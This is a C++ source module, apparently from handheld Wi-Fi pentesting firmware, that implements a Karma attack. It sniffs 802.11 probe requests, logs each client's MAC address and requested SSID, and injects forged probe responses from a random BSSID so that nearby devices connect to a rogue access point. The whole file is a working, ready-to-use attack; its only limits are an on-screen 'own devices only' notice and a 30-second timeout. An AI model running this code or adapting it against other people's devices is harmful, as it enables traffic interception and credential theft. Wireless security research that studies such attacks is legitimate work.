#include "karma_attack.h"
#include "../config.h"
#include "../core/display_mgr.h"
#include "../core/wifi_mgr.h"
#include "../utils.h"

KarmaAttack* KarmaAttack::instance = nullptr;

ModuleInterface* createKarmaAttack() { return new KarmaAttack(); }

void KarmaAttack::init() {
    memset(probes, 0, sizeof(probes));
    probeCount = 0; running = false;
    confirmed = false; startTime = 0; lastCleanup = 0;
    instance = this;
}

void KarmaAttack::enter() {
    probeCount = 0; running = false;
    confirmed = false; startTime = 0;
    instance = this;
    wifiMgr.promiscuousAcquire(getId());
    running = true;
    startTime = millis();
    displayMgr.setDirty();
}

void KarmaAttack::exit() {
    running = false;
    wifiMgr.promiscuousRelease(getId());
    instance = nullptr;
}

void KarmaAttack::sendProbeResponse(const uint8_t* clientMac, const char* ssid) {
    uint8_t ssidLen = strlen(ssid);
    uint8_t frame[128] = {0};

    // Frame control: Probe Response (0x5000)
    frame[0] = 0x50;
    frame[1] = 0x00;
    // DA = clientMac
    memcpy(frame + 4, clientMac, 6);
    // SA = random BSSID
    for (int i = 10; i < 16; i++) frame[i] = random(256);
    // BSSID = SA
    memcpy(frame + 16, frame + 10, 6);

    // Frame body
    uint8_t* body = frame + 24;
    memset(body, 0, 8); body += 8;  // Timestamp
    body[0] = 0x64; body[1] = 0x00; body += 2;  // Beacon Interval
    body[0] = 0x01; body[1] = 0x00; body += 2;  // Capability

    // SSID
    *body++ = 0x00; *body++ = ssidLen;
    memcpy(body, ssid, ssidLen); body += ssidLen;

    // Supported Rates
    *body++ = 0x01; *body++ = 4;
    body[0] = 0x82; body[1] = 0x84; body[2] = 0x8B; body[3] = 0x96;
    body += 4;

    wifiMgr.sendRawPacket(frame, body - frame);
}

void KarmaAttack::onPacket(uint8_t* buf, uint16_t len) {
    if (!instance || !instance->running || len < 24) return;

    uint8_t fc = buf[0];
    if ((fc & 0x0C) != 0x00) return;
    if (((fc >> 4) & 0x0F) != 0x04) return;  // Probe Request

    // Extract SSID
    uint8_t* body = buf + 24;
    uint16_t bodyLen = len - 24 - 4;
    char ssid[33] = "";
    for (uint16_t i = 0; i < bodyLen && i < 200; ) {
        uint8_t elemId = body[i];
        uint8_t elemLen = body[i + 1];
        if (elemId == 0 && elemLen <= 32) {
            memcpy(ssid, body + i + 2, elemLen);
            ssid[elemLen] = '\0';
            break;
        }
        i += 2 + elemLen;
    }

    // Check if already recorded
    for (uint16_t i = 0; i < instance->probeCount; i++) {
        if (memcmp(instance->probes[i].clientMac, buf + 10, 6) == 0 &&
            strcmp(instance->probes[i].ssid, ssid) == 0) {
            instance->probes[i].rssi = -(256 - buf[len - 1]);
            instance->probes[i].timestamp = millis();
            instance->sendProbeResponse(buf + 10, ssid);
            return;
        }
    }

    // New probe
    if (instance->probeCount < KARMA_MAX_PROBES && ssid[0]) {
        KarmaProbe& p = instance->probes[instance->probeCount++];
        memcpy(p.clientMac, buf + 10, 6);
        strCopySafe(p.ssid, ssid, 33);
        p.rssi = -(256 - buf[len - 1]);
        p.timestamp = millis();
        instance->sendProbeResponse(buf + 10, ssid);
    }
}

void KarmaAttack::update() {
    if (!running) return;

    if (millis() - startTime > SEC_ATTACK_MAX_DURATION) {
        running = false;
        wifiMgr.promiscuousRelease(getId());
        displayMgr.setDirty();
        return;
    }

    // Periodic cleanup
    if (millis() - lastCleanup > 10000) {
        lastCleanup = millis();
        displayMgr.setDirty();
    }
}

void KarmaAttack::handleButton(ButtonEvent ev) {
    if (ev != BTN_NONE && running) {
        running = false;
        wifiMgr.promiscuousRelease(getId());
        displayMgr.setDirty();
    }
}

void KarmaAttack::draw(U8G2& u8g2) {
    u8g2.setFont(FONT_DATA);
    u8g2.drawStr(0, 9, "Karma Attack");
    u8g2.setFont(FONT_DATA);
    u8g2.drawStr(0, 24, "⚠ Test Mode - Own Devices Only ⚠");

    if (running) {
        uint32_t remaining = (SEC_ATTACK_MAX_DURATION - (millis() - startTime)) / 1000;
        char buf[30];
        snprintf(buf, sizeof(buf), "Responding:%d left:%lus", probeCount, remaining);
        u8g2.drawStr(2, 39, buf);

        if (probeCount > 0) {
            u8g2.setFont(FONT_DATA);
            u8g2.drawStr(2, 54, probes[0].ssid);
        }
        u8g2.drawStr(2, 63, "Any key to stop");
    } else {
        u8g2.drawStr(2, 35, "Session ended (30s auto)");
    }
}
